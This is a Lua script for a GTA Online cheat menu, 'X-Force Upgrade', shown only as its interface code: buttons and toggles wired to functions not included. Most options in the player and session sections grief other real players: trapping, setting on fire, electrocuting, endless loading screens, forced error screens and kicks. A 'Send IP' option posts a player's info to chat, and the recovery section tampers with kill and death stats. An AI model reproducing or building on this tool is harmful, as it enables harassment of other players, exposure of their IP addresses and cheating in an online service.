                if PLAYER.IS_PLAYER_MODDER(i) ~= "None" then
                    infos[3] = infos[3] + 1
                end
                infos[5] = PLAYER.PLAYER_COUNT()
                if s.is_valid(i) then
                    if s.is_friend(i) then
                        infos[6] = infos[6] + 1
                    end
                end
            end
            local sh = get.name(PLAYER.GET_SCRIPT_HOST())
            if sh == "**Invalid**" then
                sh = ""
            end
            infos[4] = sh
        end
        s.wait(100)
    end
end
function hotkey_window()
    if table_settings[8][2] == true then
        push_style_var(ImGuiStyleVar_WindowRounding, 3.5)
        if begin_window(text["Hotkeys"], 1 << 6 | 1 << 0) then
            add_text("Hotkeys:\t\t\t\t\t")
            for i = 1, #table_hotkeys do
                if table_hotkeys[i][2] ~= nil then
                    add_text(table_hotkeys[i][4] .. ': "' .. table_hotkeys[i][3] .. '"')
                end
            end
        end
        pop_style_var(1)
    end
end
function WelcomeScreen()
    local sc = get_display_size()
    set_next_window_pos(vec2(sc.x / 2 - 190, 25))
    open_popup("Welcome")
    if begin_popup("Welcome", 1 << 6) then
        add_text("Welcome " .. PlayerName .. " to X-Force Upgrade!\nHope you enjoy it.")
        separator()
        add_text(version)
        separator()
        add_text(printchangelog())
        separator()
        add_button(
            "Join Our Discord",
            vec2(365, 50),
            function()
                execute("start " .. dc_invite)
            end
        )
        add_button(
            "Donate",
            vec2(365, 50),
            function()
                execute("start " .. donate_link)
            end
        )
        add_button(
            "Get Started",
            vec2(365, 25),
            function()
                wsc = false
            end
        )
        add_button(
            "Don't show this again",
            vec2(365, 25),
            function()
                table_settings[3][2] = false
                save_settings()
                s.notify("You can change this back in settings")
                wsc = false
            end
        )
        end_popup()
    end
end
function load_functions()
    create_settings()
    wait()
    load_settings()
    wait()
    save_settings()
    wait()
    if not version:find("pre") then
        check_for_version_change()
    end
    wait()
    spbotdat()
    wait()
    if table_settings[6][2] == true then
        if not version:find("pre") then
            check_for_updates()
        end
    end
    wait()
    check_for_translations()
    wait()
    create_vehbl()
    wait()
    create_hotkeys()
    wait()
    load_translation()
    wait()
    load_hotkeys()
    wait()
    save_hotkeys()
    wait()
    load_weapons_file()
    wait()
    load_outfits()
    log("Xhax Upgrade", "Outfits found: " .. #svoutfits.name)
    wait()
    load_blvehs()
    wait()
    save_veh_bl()
    wait()
    LoadFavAnim()
    wait()
    get_info()
    wait()
end
load_functions()
function guiplayerlist()
    local opt = {
        "player_options_griefing_",
        "player_options_friendly_",
        "player_options_vehicle_",
        "player_options_teleport_",
        "player_options_normal_",
        "player_options_other_"
    }
    for i = 0, 31 --[[griefing]] do
        s.button(
            opt[1] .. i,
            text["Custom Bounty"],
            "Place custom bounty on player",
            function()
                set_bounty(get.selected())
            end
        )
        s.button(
            opt[1] .. i,
            text["Fuck Up Player"],
            "Player loses ability to drive,jump,sprint,use weapons and entering some interiors",
            function()
                fuckup_player()
            end
        )
        s.button(
            opt[1] .. i,
            text["Block Pussive Mode"],
            "Prevents player from switching to passive mode",
            function()
                block_passive(get.selected())
            end
        )
        s.button(
            opt[1] .. i,
            text["Gas Player"],
            "Gas player in cage",
            function()
                gas_player(get.selected())
            end
        )
        s.button(
            opt[1] .. i,
            text["Spawn Puma"],
            "Sends attacking puma to player",
            function()
                spawn_puma(get.selected())
            end
        )
        s.button(
            opt[1] .. i,
            text["Ragdoll"],
            "Ragdolls player with invisible explosion",
            function()
                ragdoll(get.selected())
            end
        )
        s.button(
            opt[1] .. i,
            text["Fire Ass"],
            "Sets player on fire",
            function()
                inferno(get.selected())
            end
        )
        s.button(
            opt[1] .. i,
            text["Send Griefer Lester"],
            "Sends lester on Oppressor MK II",
            function()
                mk2_lester(get.selected())
            end
        )
        s.button(
            opt[1] .. i,
            text["Send Lester Attacker"],
            "Sends lester with MG",
            function()
                lesterattacker(get.selected())
            end
        )
        s.button(
            opt[1] .. i,
            text["Peds Attack Player"],
            "All nearby peds get weapon an attack player",
            function()
                pedsattack(get.selected())
            end
        )
        s.button(
            opt[1] .. i,
            text["Infinite Apartment Invite"],
            "Sends player into infinite loading",
            function()
                infinite_invite(get.selected())
            end
        )
        s.button(
            opt[1] .. i,
            text["Force Cutscene"],
            "Forces player to casino cutscene\n(You need to be close to player)",
            function()
                force_cutscene(get.selected())
            end
        )
        s.button(
            opt[1] .. i,
            text["Crush Player"],
            "Crushes player with Rihno",
            function()
                crush_player(get.selected())
            end
        )
        s.button(
            opt[1] .. i,
            text["Teleport Everything To Player"],
            "Teleport everything to player\n(Laggy)",
            function()
                teleport_everything(get.selected())
            end
        )
        s.button(
            opt[1] .. i,
            text["Trap Player"],
            "Traps player in invisible tube",
            function()
                trap_player(get.selected())
            end
        )
        s.button(
            opt[1] .. i,
            text["Send Terrorist"],
            "Sends terrorist with bomb which you can explode by pressing G",
            function()
                SendTerrorist()
            end
        )
        s.input(
            opt[1] .. i,
            text["Jets Amount"],
            1,
            1,
            16,
            1,
            16,
            function(int)
                jetsAmount = int
            end
        )
        s.toggle(
            opt[1] .. i,
            text["Transaction Error"],
            "Shows error screen",
            function(on)
                transerr[get.selected()] = on
                transaction_err(get.selected())
            end
        )
        s.toggle(
            opt[1] .. i,
            text["Send Jet Lesters"],
            "Send attackers in jets",
            function(on)
                jetLester[get.selected()] = on
                SendJets()
            end
        )
        s.toggle(
            opt[1] .. i,
            text["Electrocute"],
            "Electrocutes player in loop",
            function(on)
                electrocute[get.selected()] = on
                Electrocute(get.selected())
            end
        )
        s.toggle(
            opt[1] .. i,
            text["Ear Rape"],
            "Turn game volume down",
            function(on)
                earrape[get.selected()] = on
                EarRape(get.selected())
            end
        ) --[[s.toggle(opt[1]..i,"Disable God Mode",function(on) disablegod[get.selected()]=on DisableGod(get.selected()) end)]] --[[friendly]]
        s.button(
            opt[2] .. i,
            text["Claim Session Bounty"],
            "Player kill all players with bounty",
            function()
                claim_bounty(get.selected())
            end
        )
        s.toggle(
            opt[2] .. i,
            text["Auto Heal"],
            "Regenerates player health when hurt",
            function(on)
                autoheal[get.selected()] = on
                AutoHeal(get.selected())
            end
        ) --[[vehicle]]
        s.button(
            opt[3] .. i,
            text["Hard Vehicle Sex"],
            "Breaks vehicle physics",
            function()
                hard_vehicle_sex(get.selected())
            end
        )
        s.button(
            opt[3] .. i,
            text["Lester Takes The Wheel"],
            "Send lester that steals player's vehicle",
            function()
                lester_takes_the_wheel(get.selected())
            end
        )
        s.button(
            opt[3] .. i,
            text["Lock Inside Vehicle"],
            "Locks player inside vehicle",
            function()
                lock_inside(get.selected())
            end
        )
        s.button(
            opt[3] .. i,
            text["Rotate"],
            "Rotates vehicle to other direction",
            function()
                rotate(get.selected())
            end
        )
        s.button(
            opt[3] .. i,
            text["Flip"],
            "Flips vehicle on roof",
            function()
                flip(get.selected())
            end
        )
        s.button(
            opt[3] .. i,
            text["Boost Backwards"],
            "Boosts vehicle backwards",
            function()
                boost_backwards(get.selected())
            end
        )
        s.button(
            opt[3] .. i,
            text["Burst Tires"],
            "Pops all tires",
            function()
                burst_tyres(get.selected())
            end
        )
        s.button(
            opt[3] .. i,
            text["Explode Vehicle"],
            "Explodes vehicle",
            function()
                explode_vehicle(get.selected())
            end
        )
        s.button(
            opt[3] .. i,
            text["Lag Vehicle Boost Refill"],
            "Vehicle boost won't refill",
            function()
                lag_vehicle_boost(get.selected())
            end
        )
        s.button(
            opt[3] .. i,
            text["Fast Vehicle Boost Refill"],
            "Vehicle boost will refill instantly",
            function()
                fast_vehicle_boost(get.selected())
            end
        )
        s.button(
            opt[3] .. i,
            text["Enable Vehicle God Mode"],
            "Enables vehicle god",
            function()
                veh_god(true)
            end
        )
        s.button(
            opt[3] .. i,
            text["Disable Vehicle God Mode"],
            "Disables vehicle god",
            function()
                veh_god(false)
            end
        )
        s.button(
            opt[3] .. i,
            text["Launch Up"],
            "Launchs player high up",
            function()
                veh_launch(10000)
            end
        )
        s.button(
            opt[3] .. i,
            text["Launch Down"],
            "Launches player to ground",
            function()
                veh_launch(-10000)
            end
        )
        s.button(
            opt[3] .. i,
            text["Remove MK2 Rockets"],
            "Removes rockets from Oppressor MK II",
            function()
                no_rockets()
            end
        )
        s.button(
            opt[3] .. i,
            text["Spawn Vehicle"],
            "Spawn vehicle to player",
            function()
                if not spawnerwindow then
                    VehicleSpawner()
                end
            end
        )
        s.input(
            opt[3] .. i,
            text["Speed"],
            0,
            0,
            500,
            1,
            10,
            function(int)
                speed = int
            end
        )
        s.button(
            opt[3] .. i,
            text["Limit Max Speed"],
            "Limits vehicle top speed",
            function()
                limit_max_speed()
            end
        )
        s.toggle(
            opt[3] .. i,
            text["Need For Speed"],
            "If player will go slower than speed that you set\nvehicle will explode",
            function(on)
                nfs[get.selected()] = on
                NeedForSpeed()
            end
        )
        s.toggle(
            opt[3] .. i,
            text["Horn Boosting"],
            "Boosts vehicle when horn",
            function(on)
                hornboost[get.selected()] = on
                HornBoost(get.selected())
            end
        ) --[[teleport]]
        s.button(
            opt[4] .. i,
            text["Teleport Vehicle To Waypoint"],
            "Teleports player to waypoint you set",
            function()
                tp_player_to_wp()
            end
        )
        s.button(
            opt[4] .. i,
            text["Teleport Vehicle To Prison"],
            "Teleports player to priston",
            function()
                teleport_vehicle(1648.804, 2602.835, 49.780)
            end
        )
        s.button(
            opt[4] .. i,
            text["Teleport Vehicle To Mount Chiliad"],
            "Teleports player to Mount Chiliad",
            function()
                teleport_vehicle(451.521, 5571.784, 782.608)
            end
        )
        s.button(
            opt[4] .. i,
            text["Teleport Vehicle To Ocean"],
            "Teleports player to ocean",
            function()
                teleport_vehicle(10000, 10000, 100)
            end
        )
        s.button(
            opt[4] .. i,
            text["Teleport Vehicle To Kill Zone"],
            "Teleports player to kill zone",
            function()
                teleport_vehicle(-1396.040, -605, 31.313)
            end
        )
        s.button(
            opt[4] .. i,
            text["Teleport Vehicle Under Maze Bank"],
            "Teleports player under Maze Bank",
            function()
                teleport_vehicle(-80.893, -809.993, 36.945)
            end
        )
        s.button(
            opt[4] .. i,
            text["Teleport Vehicle To Haven"],
            "Teleports player to heaven",
            function()
                teleport_vehicle(1027.654, 3943.050, 2690.000)
            end
        ) --[[normal]]
        s.toggle(
            opt[5] .. i,
            text["Weapon Rain"],
            function(on)
                weaporain[get.selected()] = on
                WeaponRain(get.selected())
            end
        ) --[[other]]
        s.toggle(
            opt[6] .. i,
            text["Show Invisible Player"],
            "Shows player if uses invisible",
            function(on)
                show_invisible[get.selected()] = on
                ShowInvisible()
            end
        )
        s.button(
            opt[6] .. i,
            text["Send IP"],
            "Sends player's info in chat.",
            function()
                send_ip(get.selected())
            end
        )
        s.button(
            opt[6] .. i,
            text["Copy Player Info"],
            "Copy player's info to Clipboard.",
            function()
                copy_info(get.selected())
            end
        )
        wait()
    end
end
guiplayerlist()
function guiself()
    local opt = {"self_options", "self_quick_actions", "self_ped_options"}
    s.toggle(
        opt[1],
        text["Off Radar"],
        "Gives infinite off radar",
        function(on)
            otr = on
            OTR()
        end
    )
    s.toggle(
        opt[1],
        text["Clear Ped"],
        "Clear blood from your ped.",
        function(on)
            clearself = on
            ClearSelf()
        end
    )
    s.toggle(
        opt[1],
        text["Respawn At Death Coords"],
        "Respawns you at position you died",
        function(on)
            respatloc = on
            RespawnLoc()
        end
    )
    s.toggle(
        opt[1],
        text["Walk On Water"],
        "Allows you to walk on water.",
        function(on)
            walkonwater = on
            WalkOnWater()
        end
    )
    s.toggle(
        opt[1],
        text["Smash Ability"],
        "Use 'Space' to smash.",
        function(on)
            smashability = on
            SmashAbility()
        end
    )
    s.toggle(
        opt[1],
        text["Hard Impact"],
        "Sets an explosion as you hit the ground.",
        function(on)
            hardimpact = on
            HardImpact()
        end
    )
    s.toggle(
        opt[1],
        text["Local Visibility"],
        "Your ped is visible for you while using Invisible.",
        function(on)
            localvisibility = on
            LocalVis()
        end
    )
    s.toggle(
        opt[1],
        text["No Clip+"],
        "Controls: Mouse,W,S,A,D,Caps,LCtrl,LShift",
        function(on)
            noclip = on
            Noclip()
        end
    )
    s.toggle(
        opt[1],
        text["Demi God Mode"],
        "People with one-shot can still kill you.",
        function(on)
            god = on
            DemiGod()
        end
    )
    s.button(
        opt[2],
        text["Fast EWO"],
        "Instantly kills you",
        function()
            ewo()
        end
    )
    s.button(
        opt[2],
        text["Sky Dive"],
        "Teleports you high in the air",
        function()
            sky_dive()
        end
    )
    s.toggle(
        opt[3],
        text["Force Current Outfit"],
        "Applies current outfit all the time",
        function(on)
            forceoutfit = on
            ForceOutfit()
        end
    )
end
guiself()
function guisession()
    local opt = {"session_general", "session_toggles", "session_starter"}
    s.toggle(
        opt[1],
        text["Anonymous Bounty"],
        function(on)
            anonymous = on
        end
    )
    s.input(
        opt[1],
        text["Bounty Amount"],
        10000,
        0,
        10000,
        1,
        100,
        function(int)
            bounty = int
        end
    )
    s.button(
        opt[1],
        text["Set Bounty All"],
        function()
            bounty_all()
        end
    )
    s.button(
        opt[1],
        text["Send All To Mission"],
        function()
            send_all_mission()
        end
    )
    s.button(
        opt[1],
        text["Infinite Apartment Invite"],
        function()
            infinite_inviteall()
        end
    )
    s.button(
        opt[1],
        text["Trap All"],
        function()
            trapall()
        end
    )
    s.button(
        opt[1],
        text["CEO Ban All"],
        function()
            ceo_all(1)
        end
    )
    s.button(
        opt[1],
        text["CEO Kick All"],
        function()
            ceo_all(2)
        end
    )
    s.button(
        opt[1],
        text["Give All Weapons"],
        function()
            session_give_weapons()
        end
    )
    s.toggle(
        opt[2],
        text["Lobby Info"],
        function(on)
            lobbyinf = on
            LobbyInf()
        end
    )
    s.toggle(
        opt[2],
        text["Remove Spambots"],
        "Removes possible spambot rids from the session",
        function(on)
            removespambot = on
            RemoveSpambots()
        end
    )
    s.toggle(
        opt[2],
        text["Kick Barcodes"],
        "Kick players with name like: IlIlIlIl\nHost Recommended",
        function(on)
            kick_barcode = on
            KickBarcode()
        end
    )
    s.toggle(
        opt[2],
        text["Show Invisible Players"],
        function(on)
            show_invisible_pl = on
            ShowInvisiblePlayers()
        end
    )
    s.toggle(
        opt[2],
        text["Transaction Error"],
        function(on)
            transaction = on
            TransactionError()
        end
    )
    s.toggle(
        opt[2],
        text["Block Pussive Mode"],
        function(on)
            blockpussive = on
            BlockPussive()
        end
    )
    s.toggle(
        opt[2],
        text["Bribe Authorities All"],
        function(on)
            bribeauth = on
            BribeAuth()
        end
    )
    s.toggle(
        opt[2],
        text["Off Radar All"],
        function(on)
            offradar = on
            OffRadar()
        end
    )
    s.toggle(
        opt[2],
        text["Vehicle Blacklist"],
        function(on)
            vehiclablacklist = on
            VehicleBl()
        end
    )
end
guisession()
function guiweapon()
    local opt = {"weapon_mods", "weapon_gun", "weapon_impacts"}
    s.button(
        opt[1],
        text["Load Weapons"],
        "Loads saved weapons",
        function()
            load_weapons()
        end
    )
    s.toggle(
        opt[2],
        text["Push Gun"],
        "Pushes away entity you aim at",
        function(on)
            push_gun = on
            PushGun()
        end
    )
    s.toggle(
        opt[2],
        text["Airstrike Gun"],
        "Shoots rocket at bullet impact",
        function(on)
            airstrikegun = on
            AirstrikeGun()
        end
    )
    s.toggle(
        opt[2],
        text["Pick Up Gun"],
        "Use scroll to manipulate entity | Hold 'LCtrl','Space' or 'Z' to rotate\nHold 'LShift' to use precision mode",
        function(on)
            pickupgun = on
            PickUpGun()
        end
    )
    s.toggle(
        opt[2],
        text["Acceleration Gun"],
        "Accelerates vehicle you aim at.",
        function(on)
            accelgun = on
            AccelGun()
        end
    )
    s.toggle(
        opt[2],
        text["Drive It Gun"],
        "Wraps you into vehicle you shoot at.",
        function(on)
            drivegun = on
            DriveGun()
        end
    )
    s.input(
        opt[2],
        text["Scale"],
        1,
        1,
        25,
        1,
        25,
        function(int)
            scale = int
        end
    )
    s.toggle(
        opt[2],
        text["FlameThrower"],
        "This option might crash the game. Keep that in mind.",
        function(on)
            flamethrower = on
            FlameThrower_()
        end
    )
    s.toggle(
        opt[2],
        text["Xmass Tree Gun"],
        "Shoots exploding christmass trees",
        function(on)
            xmassgun = on
            XmassGun()
        end
    )
    s.toggle(
        opt[2],
        text["Kick Gun"],
        "Kicks player you shoot from lobby",
        function(on)
            kickgun = on
            KickGun()
        end
    )
    s.toggle(
        opt[3],
        text["Super Punch"],
        "Hold LMB while aiming at entity",
        function(on)
            spunch = on
            SuperPunch()
        end
    )
end
guiweapon()
function guivehicle()
    local opt = {"vehicle_options", "vehicle_quick_actions"}
    s.input(
        opt[1],
        text["Modify Top Speed"],
        0,
        0,
        1000,
        10,
        100,
        function(int)
            topspeed = int
            SetTopSpeed()
        end
    )
    s.toggle(
        opt[1],
        text["Vehicle Cam Fly"],
        "Hold Space to fly\nHold LShift to fly faster",
        function(on)
            camfly = on
            CamFly()
        end
    )
    s.toggle(
        opt[1],
        text["Slam Vehicle"],
        "You can even drive on walls while using this",
        function(on)
            slamveh = on
            SlamVeh()
        end
    )
    s.toggle(
        opt[1],
        text["Super Handbrake"],
        "Insantly stops your vehicle",
        function(on)
            instastop = on
            InstaStop()
        end
    )
    s.toggle(
        opt[1],
        text["Licence Plate Speedo"],
        function(on)
            speedolicence = on
            SpeedoLicence()
        end
    )
    s.toggle(
        opt[1],
        text["XF Licence Plate"],
        function(on)
            XFlicence = on
            XFLicence()
        end
    )
    s.toggle(
        opt[1],
        text["Auto Flip"],
        function(on)
            autoflip = on
            AutoFlip()
        end
    )
    s.toggle(
        opt[1],
        text["Anti Lock On"],
        "Your vehicle can't be locked on.",
        function(on)
            lockon = on
            AntiLockOn()
        end
    )
    s.toggle(
        opt[1],
        text["Vehicle Rapid Fire"],
        function(on)
            rapid = on
            VehRapid()
        end
    )
    s.toggle(
        opt[1],
        text["Infinite Rocket Boost"],
        function(on)
            rocketboost = on
            RocketBoost()
        end
    )
    s.button(
        opt[2],
        text["Insta Exit Vehicle"],
        function()
            insta_exit()
        end
    )
    s.button(
        opt[2],
        text["Barrel Roll L"],
        function()
            vehicle_tricks(0, 0, 10, 2, 0, 0)
        end
    )
    s.button(
        opt[2],
        text["Barrel Roll R"],
        function()
            vehicle_tricks(0, 0, 10, -2, 0, 0)
        end
    )
    s.button(
        opt[2],
        text["Backflip"],
        function()
            vehicle_tricks(0, 0, 12, 0, 2, 0)
        end
    )
    s.button(
        opt[2],
        text["Frontflip"],
        function()
            vehicle_tricks(0, 0, 12, 0, -2, 0)
        end
    )
end
guivehicle()
function guiworld()
    local opt = {"world_other"}
    s.toggle(
        opt[1],
        text["Disable Vehicles Spawn"],
        function(on)
            vehspawn = on
            DisableVehicles()
        end
    )
    s.toggle(
        opt[1],
        text["Disable Peds Spawn"],
        function(on)
            pedspawn = on
            DisablePeds()
        end
    )
end
guiworld()
function guiteleport()
    local opt = {"teleport_options", "teleport_custom"}
    s.button(
        opt[1],
        text["Drive Personal Vehicle"],
        function()
            drivepersonalveh()
        end
    )
    s.button(
        opt[1],
        text["TP Personal Vehicle To Self"],
        function()
            tp_veh_to_self()
        end
    )
    s.button(
        opt[1],
        text["Drive Last Vehicle"],
        function()
            drivelastveh()
        end
    )
    s.button(
        opt[1],
        text["TP To Last Vehicle"],
        function()
            tp_to_last_veh()
        end
    )
    s.button(
        opt[2],
        text["Copy Position"],
        function()
            copy_pos()
        end
    )
end
guiteleport()
function guirecovery()
    local opt = {"recovery_rank", "recovery_business"} --[[s.toggle(opt[2],'$750k Loop **RISKY**','This adds 750k every minute',function(on) monyeloop=on MoneyLoop() end)]]
    s.input(
        opt[1],
        text["Kills"],
        STATS.STAT_GET_INT(joaat("MPPLY_KILLS_PLAYERS")),
        -2000000000000,
        2000000000000,
        1,
        100,
        function(int)
            kills = int
        end
    )
    s.input(
        opt[1],
        text["Deaths"],
        STATS.STAT_GET_INT(joaat("MPPLY_DEATHS_PLAYER")),
        -2000000000000,
        2000000000000,
        1,
        100,
        function(int)
            deaths = int
        end
    )
    s.button(
        opt[1],
        text["Set KD"],
        function()
            kills_deaths()
        end
    )
end
guirecovery()
function guimisc()
    local opt = {"misc_nearby", "misc_fun"}
    s.toggle(
        opt[1],
        text["Launch Up Nearby Vehicles"],
        function(on)
            launchvehices = on
            LaunchUpVehicles()
        end
    )
    s.toggle(
        opt[1],
        text["Launch Up Nearby Peds"],
        function(on)
            launchpeds = on
            LaunchUpPeds()
        end
    )
    s.toggle(
        opt[1],
        text["Repair Nearby Vehicles"],
        function(on)
            repairnearby = on
            RepairNearby()
        end
    )
    s.toggle(
        opt[1],
        text["God Mode Nearby Vehicles"],
        function(on)
            godnearby = on
            GodNearby()
        end
    )
    s.toggle(
        opt[2],
        text["Max Acceleration"],
        function(on)
            maxaccel = on
            MaxAcceleration()
        end
    )
    s.toggle(
        opt[2],
        text["Horn Havoc"],
        function(on)
            hornhavoc = on
            HornHavoc()
        end
    )
    s.toggle(
        opt[2],
        text["Vehicles Explode On Impact"],
        function(on)
            explodeonimpact = on
            ExplodeOnImpact()
        end
    )
    s.toggle(
        opt[2],
        text["Hot Traffic"],
        function(on)
            hottraffic = on
            HotTraffic()
        end
    )
    s.toggle(
        opt[2],
        text["Bouncy Vehicles"],
        function(on)
            bouncyvehs = on
            BouncyVehs()
        end
    )
    s.toggle(
        opt[2],
        text["Beyblades"],
        function(on)
            beyblades = on
            Beyblades_()
        end
    )
    s.toggle(
        opt[2],
        text["Now This Is Some Tire Poppin'"],
        function(on)
            tirepopin = on
            TirePopin()
        end
    )
    s.toggle(
        opt[2],
        text["Spammy Doors"],
        function(on)
            spammydoors = on
            SpammyDoors()
        end
    )
    s.toggle(
        opt[2],
        text["Airstrike At Waypoint"],
        function(on)
            waypoitstrike = on
            WaypointAirstrike()
        end
    )
    s.toggle(
        opt[2],
        text["Ghost Rider"],
        "If no front wheel try reactivating this option",
        function(on)
            ghost_rider = on
            GhostRider()
        end
    )
    s.button(
        opt[2],
        text["Enter Bike"],
        "Toggle Ghost Rider first",
        function()
            enter_bike()
        end
    )
    s.toggle(
        opt[2],
        text["Police Mode"],
        "Use horn to activate siren",
        function(on)
            policeMode = on
            PoliceMode()
        end
    )
    s.input(
        opt[2],
        "NFS Timer",
        5,
        0,
        10,
        1,
        10,
        function(int)
            timer = int
        end
    )
    s.input(
        opt[2],
        "NFS Speed in km/h",
        100,
        0,
        540,
        1,
        100,
        function(int)
            value = int
        end
    )
end
guimisc()
s.toggle(
    "recovery_other",
    text["Heist Helper"],
    function(on)
        heisthelper = on
    end
)
s.toggle(
    "misc_lua",
    "Enable Hotkeys (beta)",
    function(on)
        hotkeys = on
        OnKeyBind()
    end
)
s.toggle(
    "self_ped_options",
    text["Saved Outfits"],
    function(on)
        show_window = on
        s.wait(100)
        while show_window do
            if is_open() then
                if ishovered1 or ishovered2 then
                    CONTROL.DISABLE_ALL_CONTROL_ACTIONS(0)
                end
            end
            wait()
        end
    end
)
s.toggle(
    "self_ped_options",
    text["Outfit Editor"],
    function(on)
        show_window_outfited = on
        s.wait(100)
        while show_window_outfited do
            for i = 1, #outfiteditor do
                var[i] = get.drawable(get.ped_id(), i)
                txtvar[i] = PED.GET_PED_TEXTURE_VARIATION(get.ped_id(), i)
            end
            for i = 1, #outfiteditorprops do
                propvar[i] = get.prop(get.ped_id(), i - 1)
                txtpropvar[i] = PED.GET_PED_PROP_TEXTURE_INDEX(get.ped_id(), i - 1)
            end
            s.wait(1000)
        end
    end
)
s.toggle(
    "settings_general",
    "Xhax Settings",
    function(on)
        settings_window = on
        s.wait(100)
        while settings_window do
            if is_open() then
                if ishovered3 or ishovered4 then
                    CONTROL.DISABLE_ALL_CONTROL_ACTIONS(0)
                end
            end
            wait()
        end
    end
)
s.toggle(
    "session_chat_messages",
    text["Chat Features"],
    function(on)
        chat_window = on
        s.wait(100)
        while chat_window do
            local t = scandir(path["ChatSinging"])
            if #t ~= #chatsongs then
                chatsongs = {}
                for p = 1, #t do
                    insert(chatsongs, t[p])
                end
            end
            for i = 1, #chatsongs do
                if chatsongs[i] ~= t[i] then
                    chatsongs = {}
                    goto continue
                end
            end
            ::continue::
            s.wait(500)
        end
    end
)
s.toggle(
    "weapon_mods",
    text["Show Weapon Manager"],
    function(on)
        show_wep_window = on
        s.wait(100)
        local tick = 99
        while show_wep_window do
            tick = tick + 1
            if tick == 100 then
                local t = scandir(path["WeaponLoadout"])
                local l = {}
                for p = 1, #t do
                    if t[p]:find("%.json") then
                        insert(l, t[p])
                    end
                end
                if #t ~= #loadouts then
                    loadouts = {}
                    for p = 1, #t do
                        loadouts[p] = t[p]:gsub("%.json", "")
                    end
                end
                for i = 1, #loadouts do
                    if loadouts[i] ~= t[i]:gsub("%.json", "") then
                        loadouts = {}
                        goto continue
                    end
                end
                ::continue::
                tick = 0
            end
            if ishovered6 then
                CONTROL.DISABLE_ALL_CONTROL_ACTIONS(0)
            end
            wait()
        end
    end
)
s.toggle(
    "world_other",
    text["Clear Area"],
    function(on)
        show_cleararea_window = on
    end
)
s.toggle(
    "world_other",
    text["Block Areas"],
    function(on)
        block_window = on
    end
)
s.toggle(
    "world_other",
    text["Black Hole"],
    function(on)
        show_blh_window = on
        s.wait(100)
        while show_blh_window do
            if blackholeinf[7] == true then
                local bl = get.coords(get.id())
                blackholeinf[1] = floor(bl.x)
                blackholeinf[2] = floor(bl.y)
                blackholeinf[3] = floor(bl.z)
            end
            s.wait(100)
        end
    end
)
s.toggle(
    "self_other",
    text["Play Animations"],
    function(on)
        play_anim = on
        s.wait(100)
        while play_anim do
            if ishovered7 or ishovered8 then
                CONTROL.DISABLE_ALL_CONTROL_ACTIONS(0)
            end
            wait()
        end
    end
)
if table_settings[4][2] == true then
    g_util.play_wav_file(file["OnStart"], false, false)
end
if table_settings[3][2] == true then
    closeWindow()
    wsc = true
end
function MainHook()
    if wsc then
        WelcomeScreen()
    end
    if show_blh_window then
        blackhole_window()
    end
    if block_window then
        blockfeatures_window()
    end
    if show_cleararea_window then
        cleararea_window()
    end
    if show_wep_window then
        weapon_window()
    end
    if chat_window then
        chatfeatures_window()
    end
    if settings_window then
        config_window()
    end
    if show_window_outfited then
        outfiteditor_window()
    end
    if show_window then
        outfits_window()
    end
    if hotkeys then
        hotkey_window()
    end
    if heisthelper then
        heist_helper()
    end
    if lobbyinf then
        lobby_info()
    end
    if spawnerwindow then
        spawn_veh()
    end
    if spunch then
        crosshair()
    end
    if reghotkey then
        hkpop()
    end
    if play_anim then
        playanim()
    end
end
local mainhook = d3d_hook(MainHook)
local hook1 = g_hooking.register_wndproc_hook(KeyLogger)
local hook2 = g_hooking.register_scripted_game_event_hook(SE_block)
log("Xhax Upgrade", "Loading finished successfully")
if info_message ~= "" and info_message ~= nil then
    s.toast(info_message)
end
if table_settings[9][2] == true then
    s.wait(100)
end
while g_isRunning do
    g_util.yield(100000000000)
end
unregister_hook(mainhook)
unregister_hook(hook1)
unregister_hook(hook2)
unregister()